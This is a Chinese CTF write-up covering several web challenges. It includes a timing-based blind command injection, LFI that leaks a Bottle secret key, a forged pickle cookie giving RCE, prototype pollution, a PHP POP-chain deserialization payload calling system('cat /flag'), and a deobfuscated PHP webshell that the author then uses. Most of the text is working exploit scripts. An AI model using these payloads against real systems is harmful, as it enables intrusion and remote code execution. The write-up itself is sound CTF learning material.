# 完美网站
	- 注意到地址中有base64编码的`tupian.png`，其中有隐写的字符串`ffffpq.php`
	- 注意到主页跳转时提示需要提供参数n, 提交n后有概率会读取参数img指定的图片
	- 写脚本爆`ffffpq.php`即可拿到flag
		- ```python
		  for _ in range(100):
		  
		      r = base_get(url, params = {
		          "n": 14,
		          "img": enc_dec.base64_encode("ffffpq.php")
		      }, acceptable_code=None, allow_redirects=False)
		      if len(r.text) == 30:
		          continue
		      if result := re.search(r"base64,(\S+)'/>", r.text):
		          print(result.group(1))
		      else:
		          print(r.text)
		      break
		  ```
- # It's Time
	- 直接用[Fenjing](https://github.com/marven11/fenjing)爆就行了
- # notrce
	- 使用`dir /flag && sleep 3`可以知道存在`/flag`文件
	- 使用`sort /flag |  gr'ep' -P 'flag{' && sleep 3`一个一个猜flag中的字符
	- 所以可以写个程序用正则爆flag
		- ```python
		  def test(regexp):
		      print(f"{regexp=}")
		      t = time.perf_counter()
		      r = requests.post(url, data = {
		          "c": f"sort /flag | gr'ep' -P '{regexp}' && sleep 1"
		      })
		      return time.perf_counter() - t > 1
		  
		  def char_type(known):
		      types = [
		          ("[A-Z]", ord("A"), ord("Z")),
		          ("[a-z]", ord("a"), ord("z")),
		          ("[0-9]", ord("0"), ord("9")),
		          ("_", ord("_"), ord("_")),
		          ("}", ord("}"), ord("}")),
		          ("{", ord("{"), ord("{")),
		      ]
		      for char_regexp, start, stop in types:
		          if test(known + char_regexp):
		              # print(f"char_type: {char_regexp=}")
		              return start, stop
		      return None, None
		  
		  def guess_from(known):
		      while True:
		          print(known)
		          start, stop = char_type(known)
		          if start is None or stop is None:
		              break
		          l, r = start, stop
		          while r - l > 0:
		              mid = (l + r) // 2
		              # print(f"guess_from: {l=} {r=}")
		              char_regexp = f"[{chr(l)}-{chr(mid)}]" if mid - l else chr(mid)
		              if test(known + char_regexp):
		                  r = mid
		              else:
		                  l = mid + 1
		          if test(known + chr(l)):
		              known += chr(l)
		          else:
		              break
		  
		      return known
		  
		  guess_from("fla")
		  
		  ```
- # JUST_LFI
  id:: 644b83b7-1c5b-4abb-9329-42c4f0b7fa44
	- 使用lfi可以看到下面的两个源码
	- `/app/app.py`源码
		- ```python
		  from bottle import route, run, template, request, response, error
		  from config.secret import key
		  import os
		  import re
		  
		  
		  @route("/")
		  def home():
		      return template("index")
		  
		  
		  @route("/look")
		  def index():
		      response.content_type = "text/plain; charset=UTF-8"
		      param = request.query.file
		      if re.search("^../app", param):
		          return "大咩大咩！！！"
		      req_path = os.path.join(os.getcwd() + "/look", param)
		      try:
		          with open(req_path) as f:
		              fi = f.read()
		      except Exception as e:
		          return "Wuhu"
		      return fi
		  
		  
		  @error(404)
		  def error404(error):
		      return template("error")
		  
		  
		  @route("/login")
		  def index():
		      try:
		          session = request.get_cookie("user", secret=key)
		          if not session or session["user"] == "ggg":
		              session = {"user": "ggg"}
		              response.set_cookie("name", session, secret=key)
		              return template("guest", name=session["user"])
		          if session["user"] == "admin":
		              return template("admin", name=session["user"])
		      except:
		          return "baDDDDDDDDDdddddddddddddddd"
		  
		  
		  if __name__ == "__main__":
		      os.chdir(os.path.dirname(__file__))
		      run(host="0.0.0.0", port=8080)
		  
		  ```
	- `/app/config/secret.py`
		- ```python
		  key = "Th1sIIIIIIsAAAsecret"
		  ```
	- 读bottle签名cookie的代码
		- ```python
		  def cookie_encode(data, key):
		      ''' Encode and sign a pickle-able object. Return a (byte) string '''
		      msg = base64.b64encode(pickle.dumps(data, -1))
		      sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
		      return tob('!') + sig + tob('?') + msg
		  ```
	- 伪造cookie并提交
		- ```python
		  import pickle
		  import base64
		  import hmac
		  import hashlib
		  import requests
		  
		  url = "xxx"
		  
		  cmd = "__import__('os').popen('{}').read()".format("echo 114514; sleep 5;")
		   
		  class payload(object):
		      def __reduce__(self):
		         return (eval, (cmd,))
		  
		  def tob(s: str):
		      return s.encode("utf-8")
		  
		  def cookie_encode(data, key):
		      ''' Encode and sign a pickle-able object. Return a (byte) string '''
		      msg = base64.b64encode(pickle.dumps(data, -1))
		      sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
		      return tob('!') + sig + tob('?') + msg
		  
		  
		  key = "Th1sIIIIIIsAAAsecret"
		  
		  cookie = cookie_encode(('user', payload()), key).decode()
		  
		  print(cookie)
		  
		  r = requests.get(f"{url}/login", cookies = {
		      "user": cookie
		  })
		  print(r.text)
		  print(r.cookies)
		  ```
- # JUST_PROTO
	- JS原型链污染
	- ```python
	  url = "http://39.107.82.142:5519"
	  r = requests.get(f"{url}/set", params = {
	      "token": "__proto__",
	      "key": "redis_set",
	      "val": "sleep 5;#"
	  })
	  r = requests.put(f"{url}/bkup")
	  print(r.text)
	  ```
- # pop
	- 普通的pop
	- 用到的链子是`TT::__destruct --> JJ::__toString --> MM::__invoke()`
	- Fast Destruct
		- php中不能有`Array(1 => 1, 1 => 2)`
		- 在这一题中，`Array(0 => tt, 0 => 114514)`会迅速销毁tt对象
	- payload生成
		- ```php
		  <?php
		  highlight_file(__FILE__);
		  class TT{
		      public $key;
		      public $c;
		      public function __destruct(){ // 对象销毁时调用
		          echo $this->key; // 将key当成字符串打印
		      }
		  
		      public function __toString(){
		          return "welcome";
		      }
		  }
		  
		  class JJ{
		      public $obj;
		      public function __toString(){ // JJ被转成字符串时调用
		          ($this -> obj)(); // 调用一个对象
		          return "1";
		      }
		      public function evil($c){
		          eval($c);
		      }
		      // public function __sleep(){
		      //     phpinfo();
		      // }
		  }
		  
		  class MM{
		      public $name;
		      public $c;
		      public function __invoke(){ // MM被当成函数调用时会调用
		          ($this->name)($this->c);
		      }
		      public function __toString(){
		          return "ok,but wrong";
		      }
		      public function __call($a, $b){
		          echo "Hacker!";
		      }
		  }
		  $mm = new MM();
		  $mm -> name = "system";
		  $mm -> c = "cat /flag";
		  $jj = new JJ();
		  $jj -> obj = $mm;
		  $tt = new TT();
		  $tt -> key = $jj;
		  $s = serialize([$tt, 114514]);
		  $s = str_replace("i:1;i:114514;", "i:0;i:114514;", $s);
		  echo urlencode($s);
		  
		  ```
- # Hackerconfused
	- 难点
		- 利用POP链读取任意文件
		- 通过glob判断文件是否存在
		- php webshell反混淆
	- 思路：
		- 构造POP链读取任意文件以及判断以某个字符串开头的文件是否存在
		- 利用POP链爆出webshell的文件名
		- 利用POP链下载webshell文件
		- 反混淆webshell
		- 利用webshell执行任意文件
	- 修改源码以更好地构造POP链
		- 主要是改了`Funny::__construct`
		- ```php
		  $CanRead = true;
		  class SFile{
		      public $name;
		      public function __construct($name) {
		          $this->name = $name;
		      }
		      public function __toString(){
		          $num = count(scandir($this->name));
		          if($num > 0){
		              return 'Not null';
		          } else {
		              return 'Access the backdoor_******.php.* in [0-f]';
		          }
		      }
		  }
		  class Funny{
		      public $name;
		      public function __construct($name){
		          $this->name = $name;
		      }
		      public function __toString(){
		          return $this->name;
		      }
		      
		      public function __destruct(){
		          global $CanRead;
		          // var_dump($name);
		          if(strstr($name, 'backdoor')!==false){
		              die('try again');
		          }
		          if($CanRead){
		              echo(file_get_contents($this->name));
		          }
		      }
		  }
		  class Fun{
		      public $secret = 'nohint.txt';
		      public function __wakeup(){
		          // echo $this->secret;
		      }
		      
		      public function __toString(){
		          global $CanRead;
		          $CanRead = true;
		          return (new Funny($this->secret))->name;
		      }
		  }
		  ```
	- 利用POP链读取任意文件
	  id:: 644a346b-a944-4ecb-a400-794cce1e04b1
		- 首先让`CanRead`为true的链是这个：`Fun::__wakeup --> Fun::__toString --> $CanRead = true;`
			- 虽然在让`CanRead`为true时就可以读取文件，但是这里无法绕过`backdoor`的限制，不选择使用
		- 之后简单地让`Funny`反序列化就行
		- payload生成
			- ```php
			  // Fun::__wakeup --> Fun::__toString --> $CanRead = true;
			  
			  $fun1 = new Fun();
			  $fun1 -> secret = new Fun();
			  $fun1 -> secret -> secret = "/etc/passwd";
			  $funny = new Funny($_GET["file"]);
			  
			  
			  echo base64_encode(serialize([$fun1, $funny]));
			  
			  ```
	- 利用glob判断文件是否存在
		- scandir在某些配置下可以接受`glob://`伪协议，读取结果是glob对应的所有文件
		- 所以我们可以通过`glob://`伪协议加上`backdoor*.php`这样的glob判断对应的glob存不存在
		- 所以可以从`backdoor_`开始一位一位往后猜
		- 首先可以通过这个生成利用`SFile`调用`scandir`的payload
		  id:: 644a3616-7de8-4241-822d-a5bb9495f5f6
			- ```php
			  $fun = new Fun();
			  $fun -> secret = new SFile($_GET["file"]);
			  
			  echo base64_encode(serialize($fun));
			  
			  ```
		- 然后直接爆
			- ```python
			  known = "backdoor_"
			  while len(known) < len("backdoor_xxxxxx"):
			      guess = known + random.choice("1234567890abcdef")
			      payload = payload_scandir("glob://./{}*php".format(guess))
			      r = requests.get(url, params = {
			          "p": payload
			      })
			      if "Not null" in r.text:
			          print(guess)
			          known = guess
			  
			  payload = get_base64_payload("./{}.php".format(known))
			  r = requests.get(url, params = {
			      "p": payload
			  })
			  print(r.text)
			  ```
			- `payload_scandir`生成调用 ((644a3616-7de8-4241-822d-a5bb9495f5f6)) 后的结果
			- `get_base64_payload`生成调用 ((644a346b-a944-4ecb-a400-794cce1e04b1)) 的结果
	- php webshell反混淆
		- 题目所给后门使用了多层eval,我们可以写一个`evall`函数，然后将`eval`替换成`evall`来获得每层eval的结果
		- `evall`的实现
			- ```php
			  function evall($s){
			      echo $s;
			      echo "\n---\n";
			      eval(str_replace("eval(", "evall(", $s));
			  }
			  ```
		- 最后的解密结果
			- ```php
			  <?php
			  $erzo_f851f55b = [
			      base64_decode('ZmxhZ3sjX2FiY2RlZn0='),
			      base64_decode('ZmxhZ3tiMHdfYjB3fQ=='),
			      base64_decode('ZmxhZ3t0ZXRfZmxhZ30='),
			      base64_decode('ZmxhZ3s5OSF6elN3Y30='),
			      base64_decode('ZmxhZ3tkZWJ1R19mdHd9'),
			      base64_decode('ZmxhZ3toZWxsX3llYWh9'),
			      base64_decode('ZmxhZ3t0NHN0fQ==')
			  ];
			  $igxc_9ce88802 = '';
			  $bbmg_1b267619 = 0;
			  foreach ($erzo_f851f55b as &$djkg_417c4fa3) {
			      $igxc_9ce88802 = $djkg_417c4fa3[$bbmg_1b267619] . $igxc_9ce88802;
			      $bbmg_1b267619++;
			  };
			  if (isset($_GET[$igxc_9ce88802])) {
			      $grxe_fd6b6fc9 = $_GET[$igxc_9ce88802];
			      $pgck_32cfe6c1 = base64_decode($grxe_fd6b6fc9);
			      $jipp_8a561003 = substr($pgck_32cfe6c1, 5, -5);
			      echo $jipp_8a561003;
			      system($jipp_8a561003);
			  } else {
			      echo base64_decode('NDA0');
			  };
			  
			  ```
	- webshell利用
		- ```python
		  passwd = "4h{galf"
		  r = requests.get(f"{url}backdoor_a5f9d3.php", params = {
		      passwd: enc_dec.base64_encode("12345{}67890".format("/readflag give me the flag"))
		  })
		  print(r.text)
		  ```
- # 施工中
	- 仔细ping
		- ```
		  [10:08:27] 200 -    0B  - /flag.php
		  [10:08:31] 302 -  120B  - /index.php  ->  /?ip=127.0.0.1
		  [10:08:32] 302 -  120B  - /index.php/login/  ->  /?ip=127.0.0.1
		  
		  ```
		- 观察到urlencode之后仍然可以正常识别